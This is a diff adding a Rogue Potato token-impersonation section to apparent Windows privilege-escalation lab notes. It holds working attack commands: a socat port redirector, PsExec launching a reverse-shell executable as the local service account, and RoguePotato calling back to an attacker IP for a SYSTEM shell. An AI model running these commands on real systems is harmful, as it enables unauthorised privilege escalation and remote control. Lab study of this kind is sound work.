@@ -399,6 +399,26 @@ I can then run this vbs with cscript on the windows target:
   
   ![image](https://user-images.githubusercontent.com/83407557/183274322-18e3f132-fe34-4494-bdb3-97f6bf700a6a.png)
 
+First I set up a socat redirector on my kali machine, which will redirect all tcp traffic destined for port 135 to port 9999 on the windows target
+  
+  `sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.123.222:9999`
+  
+Now I have to log into a service account (using psexec and my reverse.exe to simulate this on this lab machine)
+  
+`C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183311398-43e331ab-5150-439e-9de8-8e81d52aed0e.png)
+
+Now from within this service account shell, I can rerun WinPEAs to see if rotten potato will work
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183311490-59f5b8ee-db01-494b-a7d5-f8b366608d76.png)
+
+And **SeImpersonatePrivilege** is what I am looking for:
+  
+  
+Now from within this shell I can use the rottenpotato exploit to impersonate the token and get a system callback
+  
+  `C:\PrivEsc\RoguePotato.exe -r 10.6.77.38 -e "C:\PrivEsc\reverse.exe" -l 9999`
   
 ## Token Impersonation - PrintSpoofer
 ## Privilege Escalation Scripts
